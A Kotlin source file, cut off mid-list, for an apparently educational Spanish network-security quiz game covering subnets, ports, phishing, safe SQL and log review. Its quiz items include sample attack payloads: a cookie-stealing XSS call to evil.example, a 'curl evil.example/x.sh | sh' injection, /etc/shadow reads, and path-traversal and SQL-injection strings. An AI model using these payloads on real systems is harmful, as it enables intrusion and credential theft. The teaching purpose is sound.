package personal.qqq.braintraining.core

import kotlin.random.Random

/**
 * "Redes y seguridad": six games from base to advanced. Every challenge depends only on (level,
 * seed).
 */
object NetSec {
    val ids = listOf("bits", "subnet", "ports", "phishing", "sqlsafe", "logs")
    val games =
        listOf(
            Game(
                "bits",
                "Bits",
                Area.NETSEC,
                "Binario y decimal sin calculadora",
                "Convierte entre binario y decimal. Cada posición vale el doble que la de su derecha: 1, 2, 4, 8, 16… Suma solo las posiciones con 1.",
                "01",
            ),
            Game(
                "subnet",
                "Subnet Sprint",
                Area.NETSEC,
                "Subredes IPv4 al vuelo",
                "Arrastra la frontera de la máscara sobre los 32 bits de la dirección: a la izquierda, bits de red; a la derecha, de host. Cada bit de host duplica las direcciones (hosts usables = 2^bits − 2). También puedes tocar una casilla o usar − y +.",
                "/24",
            ),
            Game(
                "ports",
                "Puerto Seguro",
                Area.NETSEC,
                "Puertos y servicios de un vistazo",
                "Eres el firewall: abre o cierra cada puerto con su interruptor y pulsa Aplicar reglas. Cierra lo que te piden, abre solo lo necesario o audita un servidor. En el modo Relámpago, relaciona puerto y servicio.",
                ":22",
            ),
            Game(
                "phishing",
                "Anzuelo",
                Area.NETSEC,
                "Detecta el correo trampa",
                "Desliza cada correo o enlace: a la derecha si es seguro, a la izquierda si es una trampa (o usa los botones). Fíjate en el dominio real: lo que va justo antes de la extensión (.com, .es…). Si fallas, se resalta la pista.",
                "@",
            ),
            Game(
                "sqlsafe",
                "Consulta Segura",
                Area.NETSEC,
                "Código que no se deja inyectar",
                "Elige la consulta segura, el permiso mínimo necesario o identifica el tipo de ataque a partir del dato malicioso.",
                "{}",
            ),
            Game(
                "logs",
                "Cazador de logs",
                Area.NETSEC,
                "Encuentra la línea sospechosa",
                "Lee las cuatro líneas de registro y toca la única sospechosa. Compara horas, usuarios, orígenes y volúmenes con lo habitual.",
                ">_",
            ),
        )

    /** Story noun for "Aseguraste X de 12 …". */
    fun noun(id: String) =
        when (id) {
            "bits" -> "bits"
            "subnet" -> "redes"
            "ports" -> "puertos"
            "phishing" -> "correos"
            "sqlsafe" -> "consultas"
            else -> "registros"
        }

    fun make(id: String, l: Int, r: Random): Challenge =
        when (id) {
            "bits" -> bits(l, r)
            "subnet" -> subnet(l, r)
            "ports" -> ports(l, r)
            "phishing" -> phishing(l, r)
            "sqlsafe" -> sql(l, r)
            "logs" -> logs(l, r)
            else -> error("Juego desconocido: $id")
        }

    private fun <T> pick(r: Random, correct: T, pool: List<T>, n: Int = 4): Pair<List<T>, Int> {
        val list =
            (listOf(correct) + pool.filter { it != correct }.distinct().shuffled(r).take(n - 1))
                .shuffled(r)
        return list to list.indexOf(correct)
    }

    // ---------- Bits ----------
    private fun bits(l: Int, r: Random): Challenge {
        val n = 4 + (l - 1) * 4 / 9
        val max = 1 shl n
        val v = r.nextInt(1, max)
        val near = linkedSetOf<Int>()
        // Close distractors: one flipped bit (always), plus off-by-one values at low levels.
        for (k in (0 until n).shuffled(r)) near += v xor (1 shl k)
        if (l < 5) listOf(v + 1, v - 1, v + 2).filter { it in 0 until max }.forEach { near += it }
        val pool = near.filter { it != v }.shuffled(r).take(3).toMutableList()
        while (pool.size < 3) {
            val x = r.nextInt(max)
            if (x != v && x !in pool) pool += x
        }
        val bin = { x: Int -> x.toString(2).padStart(n, '0') }
        val terms = (n - 1 downTo 0).map { 1 shl it }
        val sum = terms.filter { v and it != 0 }
        val toDecimal = r.nextBoolean()
        val opts = (pool + v).shuffled(r)
        val a = opts.indexOf(v)
        return if (toDecimal)
            Challenge(
                Kind.CHOICE,
                "${bin(v)}\n¿Cuánto vale en decimal?",
                opts.map(Int::toString),
                a,
                deadlineMs = (30000 - l * 1500).toLong(),
                explanation =
                    "Respuesta: $v\n\n1. Valores de posición de izquierda a derecha: ${terms.joinToString(" · ")}.\n2. Suma solo donde hay un 1: ${sum.joinToString(" + ")} = $v.",
            )
        else {
            var rest = v
            val steps =
                terms.map { t ->
                    if (rest >= t) {
                        rest -= t
                        "$t cabe → 1"
                    } else "$t no cabe → 0"
                }
            Challenge(
                Kind.CHOICE,
                "$v\n¿Cómo se escribe en binario ($n bits)?",
                opts.map(bin),
                a,
                deadlineMs = (30000 - l * 1500).toLong(),
                mono = true,
                explanation =
                    "Respuesta: ${bin(v)}\n\nResta potencias de 2 de mayor a menor:\n${steps.joinToString("\n")}\nComprueba: ${sum.joinToString(" + ")} = $v.",
            )
        }
    }

    // ---------- Subnet ----------
    private fun ip(x: Long) =
        "${x shr 24 and 255}.${x shr 16 and 255}.${x shr 8 and 255}.${x and 255}"

    private fun subnet(l: Int, r: Random): Challenge {
        val p =
            when {
                l <= 3 -> r.nextInt(24, 31)
                l <= 6 -> r.nextInt(16, 31)
                else -> r.nextInt(8, 31)
            }
        val first = listOf(10L, 172L, 192L).random(r)
        val addr = (first shl 24) or (r.nextLong(0, 1L shl 24))
        val size = 1L shl (32 - p)
        val net = addr / size * size
        val bc = net + size - 1
        val hosts = size - 2
        val type =
            when {
                l <= 2 -> 0
                l <= 4 -> 1
                l <= 6 -> 2
                l == 7 -> 3
                else -> r.nextInt(4)
            }
        val k = minOf(p / 8, 3)
        val maskOct = (((0xFFFFFFFFL shl (32 - p)) and 0xFFFFFFFFL) shr (8 * (3 - k))) and 255
        val block = 256 - maskOct
        val oct = (addr shr (8 * (3 - k))) and 255
        val start = oct / block * block
        val mask = ip((0xFFFFFFFFL shl (32 - p)) and 0xFFFFFFFFL)
        val math =
            "1. /$p = máscara $mask.\n2. Octeto ${k+1}: bloque = 256 − $maskOct = $block.\n3. ${oct} cae en el bloque $start–${start+block-1}.\n4. Red ${ip(net)} · broadcast ${ip(bc)}.\n5. Hosts usables: 2^${32-p} − 2 = $hosts."
        val head = "${ip(addr)} /$p\n"
        if (type == 0) {
            val pool =
                listOf(size, size - 1, size * 2 - 2, size / 2 - 2, size + 2)
                    .filter { it > 0 }
                    .map(Long::toString)
            val (o, a) = pick(r, hosts.toString(), pool)
            return Challenge(
                Kind.CHOICE,
                "${head}¿Cuántos hosts usables tiene la subred?",
                o,
                a,
                deadlineMs = (60000 - l * 2500).toLong(),
                explanation =
                    "Respuesta: $hosts\n\nHay 2^${32-p} = $size direcciones; se restan la de red y la de broadcast.\n$math",
            )
        }
        val (q, ans) =
            when (type) {
                1 -> "¿Cuál es la dirección de red?" to net
                2 -> "¿Cuál es la dirección de broadcast?" to bc
                else -> "¿Cuál es el primer host usable?" to net + 1
            }
        val pool =
            listOf(net, bc, net + 1, bc - 1, net + size, net - size, addr)
                .filter { it in 0..0xFFFFFFFFL }
                .map(::ip)
        val (o, a) = pick(r, ip(ans), pool)
        return Challenge(
            Kind.CHOICE,
            head + q,
            o,
            a,
            deadlineMs = (60000 - l * 2500).toLong(),
            mono = true,
            explanation =
                "Respuesta: ${ip(ans)}\n\n$math" +
                    if (type == 3) "\n6. Primer host = red + 1." else "",
        )
    }

    // ---------- Ports ----------
    internal class Port(val port: Int, val service: String, val use: String, val lesson: String)

    internal val portList =
        listOf(
            Port(
                22,
                "SSH",
                "administrar servidores por consola cifrada",
                "SSH da acceso remoto a la consola. Usa claves en lugar de contraseñas y desactiva el acceso directo de root.",
            ),
            Port(
                80,
                "HTTP",
                "servir webs sin cifrar",
                "HTTP viaja en claro: cualquiera en la red puede leerlo. Redirige siempre a HTTPS.",
            ),
            Port(
                443,
                "HTTPS",
                "servir webs cifradas con TLS",
                "HTTPS es HTTP dentro de TLS. El candado indica cifrado, no que el sitio sea de fiar.",
            ),
            Port(
                53,
                "DNS",
                "resolver nombres de dominio",
                "DNS traduce nombres a IP. Un DNS abierto a Internet puede usarse en ataques de amplificación.",
            ),
            Port(
                25,
                "SMTP",
                "enviar correo entre servidores",
                "SMTP transporta el correo. Un relé abierto permite a otros enviar spam desde tu servidor.",
            ),
            Port(
                21,
                "FTP",
                "transferir archivos sin cifrar",
                "FTP envía usuario y contraseña en claro. Sustitúyelo por SFTP (sobre SSH).",
            ),
            Port(
                23,
                "Telnet",
                "consola remota sin cifrar",
                "Telnet es una consola remota sin cifrar: las contraseñas viajan en claro. Debe estar cerrado; usa SSH.",
            ),
            Port(
                3389,
                "RDP",
                "escritorio remoto de Windows",
                "RDP expuesto a Internet es objetivo habitual de fuerza bruta y ransomware. Ciérralo o ponlo tras una VPN.",
            ),
            Port(
                3306,
                "MySQL",
                "base de datos MySQL",
                "Una base de datos nunca debe escuchar en Internet: limita el 3306 a la red interna.",
            ),
            Port(
                445,
                "SMB",
                "compartir archivos en redes Windows",
                "SMB expuesto permitió la propagación de WannaCry. Bloquéalo en el perímetro.",
            ),
            Port(
                110,
                "POP3",
                "descargar correo sin cifrar",
                "POP3 descarga el correo; su versión segura es POP3S en el 995.",
            ),
            Port(
                143,
                "IMAP",
                "sincronizar buzones de correo",
                "IMAP sincroniza el buzón; su versión cifrada es IMAPS en el 993.",
            ),
            Port(
                161,
                "SNMP",
                "monitorizar equipos de red (UDP)",
                "SNMP v1/v2 usa 'comunidades' como contraseña en claro, a menudo 'public'. Usa SNMPv3.",
            ),
            Port(
                389,
                "LDAP",
                "consultar el directorio de usuarios",
                "LDAP guarda usuarios y grupos; sin cifrar expone credenciales. Usa LDAPS (636).",
            ),
            Port(
                5432,
                "PostgreSQL",
                "base de datos PostgreSQL",
                "Como toda base de datos, PostgreSQL solo debe aceptar conexiones de los servidores que la necesitan.",
            ),
            Port(
                1433,
                "MSSQL",
                "base de datos SQL Server",
                "SQL Server en el 1433 abierto a Internet recibe ataques de fuerza bruta constantes.",
            ),
            Port(
                5900,
                "VNC",
                "control remoto de escritorio multiplataforma",
                "VNC a menudo usa contraseñas débiles y sin cifrar. Accede solo a través de un túnel SSH o VPN.",
            ),
            Port(
                8080,
                "HTTP alternativo",
                "proxies y servidores web de desarrollo",
                "El 8080 suele alojar paneles de prueba o proxies olvidados: revisa qué expone.",
            ),
        )

    private fun ports(l: Int, r: Random): Challenge {
        val pool = portList.take(if (l <= 3) 8 else if (l <= 6) 13 else portList.size)
        val p = pool.random(r)
        val inverse = l >= 7 && r.nextBoolean()
        val deadline = (15000 - l * 800).toLong()
        val lesson = "${p.port} → ${p.service}: ${p.use}.\n${p.lesson}"
        return if (inverse) {
            val (o, a) = pick(r, p.port.toString(), pool.map { it.port.toString() })
            Challenge(
                Kind.CHOICE,
                "¿Qué puerto cerrarías para bloquear ${p.use}${if(l<9)" (${p.service})" else ""}?",
                o,
                a,
                deadlineMs = deadline,
                explanation = "Respuesta: ${p.port}\n\n$lesson",
            )
        } else {
            val (o, a) = pick(r, p.service, pool.map { it.service })
            Challenge(
                Kind.CHOICE,
                "Puerto ${p.port}\n¿Qué servicio escucha ahí?",
                o,
                a,
                deadlineMs = deadline,
                explanation = "Respuesta: ${p.service}\n\n$lesson",
            )
        }
    }

    // ---------- Phishing ----------
    /**
     * tier: 1 obvious clue, 2 medium, 3 subtle. [mark] is the exact text of the clue, highlighted
     * by the inbox (Fase 7).
     */
    internal class Bait(
        val text: String,
        val phishing: Boolean,
        val tier: Int,
        val clue: String,
        val mark: String,
    )

    internal val baits =
        listOf(
            Bait(
                "De: Seguridad PayPal <alertas@paypa1.com>\nAsunto: Tu cuenta será suspendida en 24 h",
                true,
                1,
                "El '1' reemplaza a la 'l' en paypa1.com. Además mete prisa con una suspensión para que no pienses.",
                "paypa1.com",
            ),
            Bait(
                "Enlace: http://paypal.com.verifica-cuenta.net/login",
                true,
                1,
                "El dominio real es verifica-cuenta.net: 'paypal.com' es solo un subdominio de adorno. Y usa http, sin cifrar.",
                "verifica-cuenta.net",
            ),
            Bait(
                "De: Netflix <facturacion@netflix-pagos-pendientes.xyz>\nAsunto: ÚLTIMO AVISO: actualiza tu tarjeta HOY",
                true,
                1,
                "Netflix escribe desde netflix.com, no desde netflix-pagos-pendientes.xyz. Las mayúsculas y el 'HOY' buscan urgencia.",
                "netflix-pagos-pendientes.xyz",
            ),
            Bait(
                "De: Atención al cliente <mibanco.soporte@gmail.com>\nAsunto: Confirma tu PIN para evitar el bloqueo",
                true,
                1,
                "Un banco nunca escribe desde una cuenta gratuita de Gmail ni te pide el PIN.",
                "@gmail.com",
            ),
            Bait(
                "Enlace: http://192.168.4.17/amazon/login.php",
                true,
                1,
                "El enlace apunta a una dirección IP, no a amazon.es. Ninguna tienda real te pide iniciar sesión así.",
                "192.168.4.17",
            ),
            Bait(
                "De: Correos <envios@correos-entrega.top>\nAsunto: Tu paquete está retenido: paga 1,99 € de aduana",
                true,
                1,
                "Correos usa correos.es. El dominio .top y el pequeño pago 'de aduana' son un fraude clásico para robar la tarjeta.",
                "correos-entrega.top",
            ),
            Bait(
                "SMS: «Agencia Tributaria: tiene un reembolso de 312 €. Reclámelo en bit.ly/dev-hac»",
                true,
                1,
                "La administración no envía devoluciones por SMS con enlaces acortados: bit.ly oculta el destino real.",
                "bit.ly/dev-hac",
            ),
            Bait(
                "De: Microsoft 365 <no-reply@micros0ft-security.com>\nAsunto: Tu contraseña caduca hoy",
                true,
                1,
                "Un cero sustituye a la 'o' en micros0ft. El dominio no es microsoft.com.",
                "micros0ft-security.com",
            ),
            Bait(
                "De: Facturación <facturas@proveedor-servicios.com>\nAdjunto: factura_pendiente.pdf.exe",
                true,
                1,
                "Doble extensión: termina en .exe, así que es un programa disfrazado de PDF.",
                ".pdf.exe",
            ),
            Bait(
                "De: Director General <direccion.urgente@outlook.com>\nAsunto: Compra 5 tarjetas regalo ya. Es confidencial",
                true,
                1,
                "Fraude del CEO: cuenta personal de Outlook, urgencia, secreto y tarjetas regalo imposibles de rastrear.",
                "@outlook.com",
            ),
            Bait(
                "Enlace: https://www.amaz0n-es.com/pedidos",
                true,
                2,
                "Typosquatting: 'amaz0n-es.com' usa un cero y un guion; el dominio oficial es amazon.es. El https no lo hace legítimo.",
                "amaz0n-es.com",
            ),
            Bait(
                "Enlace: https://login.microsoftonline.com.auth-session.io/",
                true,
                2,
                "El dominio real es auth-session.io; todo lo anterior es un subdominio que copia el de Microsoft.",
                "auth-session.io",
            ),
            Bait(
                "De: Apple <no_reply@apple.id-soporte.com>\nAsunto: Tu Apple ID se usó en un dispositivo nuevo",
                true,
                2,
                "El dominio es id-soporte.com, no apple.com: 'apple.' es solo un subdominio.",
                "id-soporte.com",
            ),
            Bait(
                "Enlace: https://dhl.com-tracking.info/ES/89231",
                true,
                2,
                "El dominio real es com-tracking.info. El 'dhl.com-' engaña porque el guion no separa dominios.",
                "com-tracking.info",
            ),
            Bait(
                "De: Soporte IT <it-helpdesk@empresa-portal.net>\nAsunto: Valida tu VPN antes de las 17:00\n(Tu empresa usa @empresa.com)",
                true,
                2,
                "El remitente no coincide: empresa-portal.net no es empresa.com. La hora límite añade presión.",
                "empresa-portal.net",
            ),
            Bait(
                "Enlace: https://www.paypal.com@inicio-seguro.ru/",
                true,
                2,
                "Todo lo que va antes de la '@' en una URL es un nombre de usuario: el navegador abre inicio-seguro.ru.",
                "@inicio-seguro.ru",
            ),
            Bait(
                "Enlace: https://mibanco-es.online/acceso\n(Tu banco es mibanco.es)",
                true,
                2,
                "mibanco-es.online es otro dominio distinto de mibanco.es. Basta un guion y otra extensión para engañar.",
                "mibanco-es.online",
            ),
            Bait(
                "Enlace: https://xn--pypal-4ve.com/signin",
                true,
                3,
                "'xn--' indica punycode: el dominio usa una letra de otro alfabeto (como la 'а' cirílica) para imitar 'paypal'.",
                "xn--pypal-4ve.com",
            ),
            Bait(
                "Enlace: https://www.rnicrosoft.com/account",
                true,
                3,
                "'rn' juntas parecen una 'm': rnicrosoft.com no es microsoft.com.",
                "rnicrosoft.com",
            ),
            Bait(
                "De: LinkedIn <notificaciones@linkedln.com>\nAsunto: Tienes 3 mensajes nuevos",
                true,
                3,
                "'linkedln' usa una 'l' minúscula en lugar de la 'i': no es linkedin.com.",
                "linkedln.com",
            ),
            Bait(
                "Enlace: https://www.dropbox.co/s/plan-q3.xlsx",
                true,
                3,
                "dropbox.co (Colombia) no es dropbox.com: cambiar la extensión de dominio es otra forma de typosquatting.",
                "dropbox.co/",
            ),
            Bait(
                "De: PayPal <service@secure-paypal.com>\nAsunto: Recibo de tu pago de 49,99 €",
                true,
                3,
                "secure-paypal.com no pertenece a PayPal: añadir 'secure-' a una marca crea un dominio nuevo cualquiera.",
                "secure-paypal.com",
            ),
            Bait(
                "De: Amazon <confirmar-envio@amazon.es>\nAsunto: Tu pedido ha sido enviado",
                false,
                1,
                "El remitente usa amazon.es, el dominio oficial, y no pide datos ni mete prisa.",
                "amazon.es",
            ),
            Bait(
                "Enlace: https://www.paypal.com/myaccount/summary",
                false,
                1,
                "Dominio oficial paypal.com con https y una ruta normal de la cuenta.",
                "paypal.com/",
            ),
            Bait(
                "Enlace: https://accounts.google.com/signin",
                false,
                1,
                "accounts.google.com es un subdominio de google.com, el inicio de sesión oficial.",
                "accounts.google.com",
            ),
            Bait(
                "De: Soporte IT <helpdesk@empresa.com>\nAsunto: Mantenimiento programado el sábado de 22:00 a 23:00\n(Tu empresa usa @empresa.com)",
                false,
                1,
                "Remitente del dominio de tu empresa, mensaje informativo, sin enlaces ni peticiones de datos.",
                "helpdesk@empresa.com",
            ),
            Bait(
                "Enlace: https://es.wikipedia.org/wiki/Phishing",
                false,
                1,
                "es.wikipedia.org pertenece a wikipedia.org y la URL no pide nada.",
                "es.wikipedia.org",
            ),
            Bait(
                "De: Netflix <info@mailer.netflix.com>\nAsunto: Novedades de este mes",
                false,
                2,
                "mailer.netflix.com es un subdominio de netflix.com: el dominio real (justo antes de .com) es netflix.",
                "mailer.netflix.com",
            ),
            Bait(
                "Enlace: https://login.microsoftonline.com/common/oauth2/authorize",
                false,
                2,
                "microsoftonline.com es el dominio oficial de inicio de sesión de Microsoft 365.",
                "login.microsoftonline.com",
            ),
            Bait(
                "De: GitHub <noreply@github.com>\nAsunto: [GitHub] Se añadió una nueva clave SSH a tu cuenta",
                false,
                2,
                "Remitente oficial github.com. Es un aviso de seguridad real: no pide credenciales; si no fuiste tú, entra tú mismo en la web.",
                "noreply@github.com",
            ),
            Bait(
                "Enlace: https://www.correos.es/es/es/herramientas/localizador/envios",
                false,
                2,
                "correos.es es el dominio oficial y la ruta corresponde al localizador de envíos.",
                "correos.es",
            ),
            Bait(
                "De: Mi Banco <avisos@mibanco.es>\nAsunto: Tu extracto mensual ya está disponible en la app",
                false,
                2,
                "Dominio oficial, sin enlaces ni urgencia: te remite a la app que ya usas.",
                "avisos@mibanco.es",
            ),
            Bait(
                "Enlace: https://appleid.apple.com/account/manage",
                false,
                3,
                "Parece raro, pero appleid.apple.com es un subdominio de apple.com: el dominio real es apple.com.",
                "appleid.apple.com",
            ),
            Bait(
                "Enlace: https://www.dhl.com/es-es/home/rastreo.html",
                false,
                3,
                "dhl.com es el dominio real; la ruta va después de la primera '/', así que no importa lo que diga.",
                "www.dhl.com",
            ),
            Bait(
                "Enlace: https://drive.google.com/file/d/1aB9xQ/view",
                false,
                3,
                "drive.google.com pertenece a google.com. Aun así, ábrelo solo si esperabas ese archivo.",
                "drive.google.com",
            ),
        )

    private fun phishing(l: Int, r: Random): Challenge {
        val tier = 1 + (l - 1) * 3 / 10
        val pool = baits.filter { it.tier in (tier - 1).coerceAtLeast(1)..tier }
        val b = pool.random(r)
        return Challenge(
            Kind.CHOICE,
            b.text,
            listOf("Legítimo", "Phishing"),
            if (b.phishing) 1 else 0,
            deadlineMs = (20000 - l * 1000).toLong(),
            explanation = "Respuesta: ${if(b.phishing)"phishing" else "legítimo"}\n\n${b.clue}",
        )
    }

    // ---------- SQL ----------
    internal class Pair2(val bad: String, val good: String, val lesson: String)

    internal val queries =
        listOf(
            Pair2(
                "\"SELECT * FROM users WHERE name='\" + name + \"'\"",
                "db.query(\"SELECT * FROM users WHERE name = ?\", name)",
                "Concatenar texto del usuario permite cerrar la comilla e inyectar SQL (' OR '1'='1). El marcador ? envía el dato aparte y nunca se ejecuta como código.",
            ),
            Pair2(
                "f\"SELECT * FROM orders WHERE id = {order_id}\"",
                "cur.execute(\"SELECT * FROM orders WHERE id = %s\", (order_id,))",
                "Una f-string mete el valor dentro del SQL. execute con parámetros separa código y datos.",
            ),
            Pair2(
                "\$sql = \"DELETE FROM posts WHERE id=\" . \$_GET['id'];",
                "\$st = \$pdo->prepare(\"DELETE FROM posts WHERE id = ?\");\n\$st->execute([\$_GET['id']]);",
                "\$_GET viene del navegador: con id=1 OR 1=1 se borrarían todos los posts. PDO::prepare lo trata como dato.",
            ),
            Pair2(
                "stmt.executeQuery(\"SELECT * FROM cuentas WHERE iban='\" + iban + \"'\")",
                "ps = conn.prepareStatement(\"SELECT * FROM cuentas WHERE iban = ?\");\nps.setString(1, iban);",
                "PreparedStatement compila la consulta antes de recibir el dato; Statement con concatenación no.",
            ),
            Pair2(
                "db.run(`UPDATE users SET email='\${email}' WHERE id=\${id}`)",
                "db.run(\"UPDATE users SET email = ? WHERE id = ?\", [email, id])",
                "Una plantilla de JavaScript sigue siendo concatenación. Pasa los valores como array de parámetros.",
            ),
            Pair2(
                "\"SELECT * FROM products ORDER BY \" + sortColumn",
                "allowed = {\"price\",\"name\"}\nif sortColumn in allowed: query(\"... ORDER BY \" + sortColumn)",
                "Los nombres de columna no admiten '?'. Se usa una lista blanca de valores permitidos.",
            ),
            Pair2(
                "cmd.CommandText = \"SELECT * FROM clientes WHERE dni='\" + txtDni.Text + \"'\";",
                "cmd.CommandText = \"SELECT * FROM clientes WHERE dni = @dni\";\ncmd.Parameters.AddWithValue(\"@dni\", txtDni.Text);",
                "En .NET los parámetros con nombre (@dni) evitan la inyección; el texto del formulario nunca se mezcla con el SQL.",
            ),
            Pair2(
                "\"SELECT * FROM users WHERE user='\" + u + \"' AND pass='\" + p + \"'\"",
                "\"SELECT hash FROM users WHERE user = ?\" + verificar(p, hash)",
                "Además de parametrizar, la contraseña se compara con un hash; con concatenación, u = admin'-- entraría sin contraseña.",
            ),
            Pair2(
                "query(\"SELECT * FROM logs WHERE day = '\" + escapeQuotes(day) + \"'\")",
                "query(\"SELECT * FROM logs WHERE day = ?\", day)",
                "Escapar comillas a mano falla con codificaciones y casos raros. Los parámetros son la defensa correcta.",
            ),
            Pair2(
                "User.where(\"name = '#{params[:name]}'\")",
                "User.where(name: params[:name])",
                "Interpolar #{} en un fragmento SQL es inyectable. El hash de condiciones del ORM parametriza solo.",
            ),
        )

    internal class Grant(val need: String, val bad: String, val good: String, val lesson: String)

    internal val grants =
        listOf(
            Grant(
                "La web solo muestra el catálogo de productos.",
                "GRANT ALL PRIVILEGES ON tienda.* TO 'web';",
                "GRANT SELECT ON tienda.productos TO 'web';",
                "Mínimo privilegio: si la web solo lee el catálogo, basta SELECT sobre esa tabla. Con ALL, una inyección podría borrar o modificar todo.",
            ),
            Grant(
                "El servicio de informes solo lee ventas.",
                "GRANT SELECT, INSERT, UPDATE, DELETE ON erp.ventas TO 'informes';",
                "GRANT SELECT ON erp.ventas TO 'informes';",
                "Un informe no escribe: INSERT, UPDATE y DELETE sobran.",
            ),
            Grant(
                "La app registra pedidos nuevos.",
                "GRANT INSERT ON tienda.pedidos TO 'app';\nGRANT DROP ON tienda.* TO 'app';",
                "GRANT INSERT ON tienda.pedidos TO 'app';",
                "DROP permite eliminar tablas enteras: ninguna app de pedidos lo necesita.",
            ),
            Grant(
                "Un script de copia de seguridad lee todas las tablas.",
                "GRANT SELECT ON *.* TO 'backup' WITH GRANT OPTION;",
                "GRANT SELECT, LOCK TABLES ON *.* TO 'backup';",
                "WITH GRANT OPTION deja que esa cuenta reparta permisos a otros: sobra en una copia de seguridad.",
            ),
            Grant(
                "El formulario de contacto guarda mensajes.",
                "GRANT INSERT ON web.mensajes TO 'contacto';\nGRANT SUPER ON *.* TO 'contacto';",
                "GRANT INSERT ON web.mensajes TO 'contacto';",
                "SUPER es un privilegio de administración global. El formulario solo necesita INSERT en su tabla.",
            ),
            Grant(
                "Un panel de soporte consulta y actualiza tickets.",
                "GRANT ALL ON soporte.* TO 'panel';\nGRANT FILE ON *.* TO 'panel';",
                "GRANT SELECT, UPDATE ON soporte.tickets TO 'panel';",
                "FILE permite leer y escribir archivos del servidor y ALL abarca todo el esquema. SELECT y UPDATE sobre tickets bastan.",
            ),
        )

    internal class Attack(val payload: String, val type: String, val lesson: String)

    private val attackTypes =
        listOf("Inyección SQL", "XSS", "CSRF", "Path traversal", "Inyección de comandos")
    internal val attacks =
        listOf(
            Attack(
                "usuario: admin' --",
                "Inyección SQL",
                "La comilla cierra el texto y '--' comenta el resto de la consulta, incluida la comprobación de contraseña.",
            ),
            Attack(
                "id=5 UNION SELECT username, password FROM users",
                "Inyección SQL",
                "UNION SELECT añade los resultados de otra tabla a la respuesta: robo de credenciales.",
            ),
            Attack(
                "buscar: ' OR '1'='1",
                "Inyección SQL",
                "'1'='1' siempre es cierto, así que la condición deja pasar todas las filas.",
            ),
            Attack(
                "comentario: <script>fetch('//evil.example/?c='+document.cookie)</script>",
                "XSS",
                "Se inyecta JavaScript que se ejecuta en el navegador de otros usuarios y roba su cookie. Se evita escapando la salida HTML.",
            ),
            Attack(
                "nombre: <img src=x onerror=alert(1)>",
                "XSS",
                "El atributo onerror ejecuta código al fallar la imagen: XSS sin etiqueta <script>.",
            ),
            Attack(
                "<form action=\"https://banco.example/transferir\" method=POST>\n<input name=importe value=900>\n</form><script>document.forms[0].submit()</script>\n(en una web ajena)",
                "CSRF",
                "Una web ajena envía una petición usando la sesión abierta de la víctima. Se evita con tokens anti-CSRF y cookies SameSite.",
            ),
            Attack(
                "<img src=\"https://router.local/admin/reset?confirm=1\">\n(en un foro)",
                "CSRF",
                "Al cargar la imagen, el navegador hace la petición con las credenciales del usuario sin que lo sepa.",
            ),
            Attack(
                "GET /descargar?archivo=../../../../etc/passwd",
                "Path traversal",
                "Cada '../' sube un directorio hasta salir de la carpeta permitida y leer archivos del sistema.",
            ),
            Attack(
                "GET /img?f=..%2F..%2Fconfig%2F.env",
                "Path traversal",
                "%2F es una '/' codificada: es '../' disfrazado para leer el fichero .env con secretos.",
            ),
            Attack(
                "ping: 8.8.8.8; cat /etc/shadow",
                "Inyección de comandos",
                "El ';' termina el ping y encadena otro comando del sistema. Nunca pases entradas a una shell.",
            ),
            Attack(
                "archivo: informe.pdf && curl evil.example/x.sh | sh",
                "Inyección de comandos",
                "'&&' ejecuta un segundo comando que descarga y lanza un script.",
            ),
            Attack(
                "host: `whoami`",
                "Inyección de comandos",
                "Las comillas invertidas hacen que la shell ejecute whoami y sustituya su resultado.",
            ),
        )

    private fun sql(l: Int, r: Random): Challenge {
        val kind =
            when {
                l <= 3 -> 0
                l <= 6 -> r.nextInt(2)
                else -> listOf(0, 1, 2, 2).random(r)
            }
        val deadline = (40000 - l * 1500).toLong()
        return when (kind) {
            0 -> {
                val q = queries.random(r)
                val goodFirst = r.nextBoolean()
                Challenge(
                    Kind.CHOICE,
                    "¿Qué consulta es segura?",
                    if (goodFirst) listOf(q.good, q.bad) else listOf(q.bad, q.good),
                    if (goodFirst) 0 else 1,
                    deadlineMs = deadline,
                    mono = true,
                    explanation = "Respuesta: la consulta parametrizada.\n\n${q.lesson}",
                )
            }
            1 -> {
                val g = grants.random(r)
                val goodFirst = r.nextBoolean()
                Challenge(
                    Kind.CHOICE,
                    "${g.need}\n¿Qué permiso sigue el mínimo privilegio?",
                    if (goodFirst) listOf(g.good, g.bad) else listOf(g.bad, g.good),
                    if (goodFirst) 0 else 1,
                    deadlineMs = deadline,
                    mono = true,
                    explanation = "Respuesta: ${g.good.lines().first()}\n\n${g.lesson}",
                )
            }
            else -> {
                val a = attacks.random(r)
                val (o, i) = pick(r, a.type, attackTypes)
                Challenge(
                    Kind.CHOICE,
                    "¿Qué tipo de ataque es?",
                    o,
                    i,
                    deadlineMs = deadline,
                    board = listOf(a.payload),
                    explanation = "Respuesta: ${a.type}\n\n${a.lesson}",
                )
            }
        }
    }

    // ---------- Logs ----------
    internal class Clue(val tier: Int, val line: (Random) -> String, val why: String)

    private fun t(r: Random, from: Int = 8, to: Int = 19) =
        "%02d:%02d:%02d".format(r.nextInt(from, to), r.nextInt(60), r.nextInt(60))

    private fun lan(r: Random) = "10.0.${r.nextInt(1,4)}.${r.nextInt(2,250)}"

    private val users = listOf("lucia", "pablo", "maria", "jorge")
    private val normal: List<(Random) -> String> =
        listOf(
            { r -> "${t(r)} sshd: Accepted publickey for deploy from ${lan(r)}" },
            { r -> "${t(r)} nginx: 200 GET /productos?page=${r.nextInt(2,9)} ${lan(r)}" },
            { r -> "${t(r)} sudo: admin : COMMAND=/usr/bin/systemctl restart nginx" },
            { r -> "${t(r)} cron: (backup) CMD /opt/scripts/backup.sh" },
            { r -> "${t(r)} auth: login OK user=${users.random(r)} from ${lan(r)} (Madrid)" },
            { r -> "${t(r)} nginx: 304 GET /static/app.css ${lan(r)}" },
            { r -> "${t(r)} kernel: eth0 link up 1000Mbps" },
            { r -> "${t(r)} smb: ${users.random(r)} abrió \\\\files\\ventas\\informe.xlsx" },
            { r -> "${t(r)} auth: logout user=${users.random(r)}" },
            { r -> "${t(r)} nginx: 200 GET /api/carrito ${r.nextInt(1,9)}.${r.nextInt(10)} KB" },
            { r -> "${t(r)} sshd: Failed password for jorge from ${lan(r)} (x1)" },
        )
    internal val clues =
        listOf(
            Clue(
                1,
                { r ->
                    "03:14:${"%02d".format(r.nextInt(60))} sshd: Failed password for root from 185.220.101.${r.nextInt(2,250)} (x${r.nextInt(150,400)})"
                },
                "Cientos de intentos fallidos contra root desde una IP externa de madrugada: ataque de fuerza bruta. Bloquea la IP y prohíbe el login de root.",
            ),
            Clue(
                1,
                { r -> "${t(r)} nginx: 200 GET /../../etc/passwd 203.0.113.${r.nextInt(2,250)}" },
